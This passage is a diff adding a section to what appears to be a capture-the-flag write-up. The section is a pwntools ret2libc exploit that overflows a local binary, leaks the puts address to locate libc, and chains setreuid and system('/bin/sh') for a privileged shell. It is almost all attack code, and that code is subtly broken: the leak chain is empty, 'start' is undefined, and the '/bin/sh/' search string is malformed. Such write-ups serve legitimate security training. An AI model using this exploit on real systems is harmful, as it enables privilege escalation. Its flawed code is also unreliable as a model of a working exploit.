@@ -234,3 +234,49 @@ $ cat flag.txt
 flag{l34k_2_pwn}
 ```
 
+## Task 6 - final ret2libc
+
+```python
+from pwn import *
+
+context.update(arch='amd64', os='linux')
+
+#useful locations
+elf = ELF("./final")
+plt_puts = elf.plt.puts
+got_puts = elf.got.puts
+rop = ROP(elf)
+pop_rdi = rop.rdi.address
+
+p = process("./final")
+
+#ROP exploit
+payload  = cyclic(cyclic_find('kaaa'))
+payload += rop.chain()
+payload += p64(start)
+
+p.sendline(payload)
+
+print(p.recvline())
+leak_data = p.recv(6)
+puts_addr = unpack(leak_data, "all")
+
+libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+puts_offset = libc.sym.puts
+libc_base = puts_addr - puts_offset
+libc.address = libc_base
+bin_sh = next(libc.search(b'/bin/sh/'))
+
+rop = ROP(libc)
+rop.setreuid(1006, 1006)
+rop.system(bin_sh)
+rop.exit(0)
+
+payload2 = cyclic(cyclic_find('kaaa'))
+payload2 += rop.chain()
+
+p.sendline(payload2)
+p.interactive()
+```
+
+
